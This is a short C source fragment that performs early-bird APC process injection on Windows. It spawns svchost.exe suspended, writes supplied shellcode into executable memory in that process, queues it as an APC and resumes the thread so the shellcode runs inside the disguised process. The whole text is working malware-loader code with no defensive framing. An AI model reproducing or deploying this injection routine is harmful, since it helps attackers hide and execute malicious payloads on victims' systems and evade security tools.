

void execute(PVOID shellcode_mem) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Create a suspended process. "svchost.exe" is a common choice.
    if (!CreateProcessA(
        NULL,
        "svchost.exe",
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return;
    }

    // Allocate memory in the remote process
    PVOID remote_mem = VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remote_mem == NULL) {
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // Write the shellcode into the remote process
    if (!WriteProcessMemory(pi.hProcess, remote_mem, shellcode_mem, 0x1000, NULL)) {
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // Queue an APC to the main thread of the suspended process
    if (QueueUserAPC((PAPCFUNC)remote_mem, pi.hThread, 0) == 0) {
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // Resume the process. The APC will be executed, running our shellcode.
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
